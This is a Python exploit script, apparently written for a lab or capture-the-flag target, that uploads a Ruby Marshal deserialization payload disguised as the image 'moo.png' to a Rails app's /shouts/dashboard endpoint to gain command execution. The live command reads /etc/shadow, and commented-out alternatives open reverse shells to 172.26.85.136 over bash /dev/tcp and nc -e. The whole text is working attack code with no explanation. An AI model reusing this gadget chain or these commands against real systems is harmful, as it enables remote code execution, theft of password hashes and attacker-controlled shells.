#!/usr/bin/env python3
import requests, json

cmd = b'cat /etc/shadow'
# cmd = b'bash -i >& /dev/tcp/172.26.85.136/3001 0>&1'
# cmd = b'nc 172.26.85.136 3001 -e /bin/bash'
payload = \
	b"\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\a:\t@srcI\"\x16`" + \
	cmd + \
	b"`\x06:\x06ET:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"

# print(payload)
files = {
	"image": ('moo.png', payload, 'image/png'),
	"commit": "Shout!",
}

data = {
	"message": 'moo',
}

r = requests.post("http://localhost:3000/shouts/dashboard", files = files, data = data)

print('--------req')
print(r.request.url, r.request.body, r.request.headers)
print('--------resp')
print(r.status_code, r.reason)
